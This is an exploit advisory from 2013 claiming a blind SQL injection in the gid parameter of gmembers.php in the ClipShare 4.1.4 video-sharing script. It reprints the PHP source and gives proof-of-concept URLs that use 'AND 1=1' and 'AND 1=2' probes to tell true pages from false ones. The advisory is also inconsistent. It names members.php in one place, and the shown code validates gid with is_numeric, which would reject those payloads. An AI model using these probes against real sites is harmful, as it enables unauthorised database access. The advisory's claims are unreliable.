# Exploit Author: Esac
# Vulnerable Software: ClipShare - Video Sharing Community Script 4.1.4
# Official site: http://www.clip-share.com
# Software License: Commercial.
#all versions are vulnerable:
#Note : this vulnerable work just if there is a group added to the community
#Last Checked: 24 March 2013
 
#to exploit this vulnerability MAGIC_QUOTES_GPC directive must be turned off on server side.(php.ini)
 
==============================================================================================
 
#Vulnerable Script:
PHP script : members.php  on line 23
 
=========================== BEGIN OF gmembers.php =============================================
 
<?php
/************************************************************************************************
| Software Name        : ClipShare - Video Sharing Community Script
| Software Author      : Clip-Share.Com / ScriptXperts.Com
| Website              : http://www.clip-share.com
| E-mail               : office@clip-share.com
|**************************************************************************************************
| This source file is subject to the ClipShare End-User License Agreement, available online at:
| http://www.clip-share.com/video-sharing-script-eula.html
| By using this software, you acknowledge having read this Agreement and agree to be bound thereby.
|**************************************************************************************************
| Copyright (c) 2006-2007 Clip-Share.com. All rights reserved.
|**************************************************************************************************/
 
require(&#039;include/config.php&#039;);
require(&#039;include/function.php&#039;);
require(&#039;classes/pagination.class.php&#039;);
require(&#039;language/&#039; .$_SESSION[&#039;language&#039;]. &#039;/gmembers.lang.php&#039;);
 
$gname  = NULL;
$gurl   = NULL;
$oid    = NULL;
$gid    = ( isset($_REQUEST[&#039;gid&#039;]) && is_numeric($_REQUEST[&#039;gid&#039;]) ) ? mysql_real_escape_string($_REQUEST[&#039;gid&#039;]) : NULL;
$sql    = "SELECT * FROM group_own WHERE GID=&#039;" .$gid. "&#039; limit 1";
$rs     = $conn->execute($sql);
if ( $conn->Affected_Rows() == 1 ) {
    $urlkey     = $rs->fields[&#039;gurl&#039;];
    $gname      = $rs->fields[&#039;gname&#039;];
    $gupload    = $rs->fields[&#039;gupload&#039;];
    $oid        = $rs->fields[&#039;OID&#039;];
    STemplate::assign(&#039;gname&#039;, $gname);
    STemplate::assign(&#039;gurl&#039;, $urlkey);
    STemplate::assign(&#039;gupload&#039;, $gupload);
} else {
    session_write_close();
    header(&#039;Location: &#039; .$config[&#039;BASE_URL&#039;]. &#039;/error.php?type=group_missing&#039;);
    die();
}
...........................................;
...............................................
  
?>
 
============================================================================================================
 
 
  
Poc :
 
http://server/mavideo/gmembers.php?gid=6 [Blind SQLi]
 
Real exploitation :
 
 http://server/mavideo/gmembers.php?gid=6 AND 1=1
==> return normal page
 
http://server/mavideo/gmembers.php?gid=6 AND 1=2
==> return page with some errors ( or with nothing - white page )
 
 
 
--------------------------------------------------------------------------------------
PwnEd.
Tested version:
Sunday , March 24, 2013 | Version: 4.1.4 | Username: admin | Logout
Copyright Â© 2006-2008 ClipShare. All rights reserved.
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
Greetz : White Tarbouch Team
 
./Esac

